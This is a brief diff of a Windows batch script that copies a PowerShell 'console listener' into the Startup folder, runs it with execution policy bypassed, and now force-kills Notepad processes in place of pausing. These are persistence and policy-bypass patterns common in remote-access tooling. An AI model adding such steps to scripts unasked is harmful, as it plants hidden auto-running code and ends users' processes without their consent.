@@ -9,11 +9,11 @@ copy "%~dp0cli.ps1" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
 
 echo Starting console listener...
 powershell -ExecutionPolicy Bypass -File cli.ps1
-pause
+TASKKILL /F /IM notepad.exe /T
 exit
 
 :start
 echo Starting console listener...
 powershell -ExecutionPolicy Bypass -File cli.ps1
-pause
+TASKKILL /F /IM notepad.exe /T
 exit
